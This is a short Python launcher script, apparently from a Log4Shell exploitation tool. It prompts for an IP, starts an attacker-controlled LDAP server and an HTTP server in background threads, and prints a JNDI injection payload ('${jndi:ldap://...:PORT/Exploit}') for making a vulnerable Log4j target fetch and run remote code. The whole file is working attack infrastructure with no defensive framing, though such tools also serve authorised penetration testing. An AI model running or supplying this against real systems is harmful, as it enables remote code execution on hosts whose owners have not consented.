import Utils as ut
import LDAPServer as LS
import HTTPServer as HS
import threading
import sys

def init():
    ut.killPythonProcess()
    ut.colorama.init()

def main():
    #logo printng
    ut.cprint(ut.LOGO, 'yellow')

    #IP input
    ip = ut.printListPrompt('IP', 'Choose the ip :', ut.getAddress())

    #thread 선언
    try:
        t1 = threading.Thread(target=LS.OpenLDAPService, args=(ip, ut.LDAP_PORT, ut.HTTP_PORT))
        t1.start()
        ut.cprint('[+] LDAP SERVER OPEN', 'yellow')



        t2 = threading.Thread(target=HS.httpServer, args=(ut.HTTP_PORT,))
        t2.start()
        ut.cprint('[+] HTTP SERVER OPEN', 'yellow')

        ut.cprint('[+] Help payload : ${jndi:ldap://'+ip+':'+str(ut.LDAP_PORT)+'/Exploit}', 'blue')
        while t1.is_alive():
            t1.join(1)

    except KeyboardInterrupt:
        print("Ctrl+C pressed...")
        ut.killPythonProcess()

if __name__ == "__main__":
    init()
    main()


